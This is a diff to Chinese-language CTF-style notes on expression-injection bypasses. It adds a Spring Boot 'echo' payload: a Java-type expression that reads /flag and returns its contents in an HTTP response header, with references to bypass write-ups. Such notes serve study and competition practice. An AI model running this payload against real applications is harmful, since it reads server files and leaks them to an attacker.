@@ -110,6 +110,11 @@ print(')}')
 
 其他bypass: https://xz.aliyun.com/t/9245
 
+## springboot回显
+```
+Java.type("org.springframework.web.context.request.RequestContextHolder").currentRequestAttributes().getResponse().addHeader("test",new java.lang.String(Java.type("sun.misc.IOUtils").readFully(new java.io.FileInputStream("/flag"),1024,false)));
+```
+
 ## 参考
 > https://xz.aliyun.com/t/9245   **可以使用#request.getRequestedSessionId() 或者 #request.getHeader('User-Agent') 反正可以使用request对象或者respose**
 >
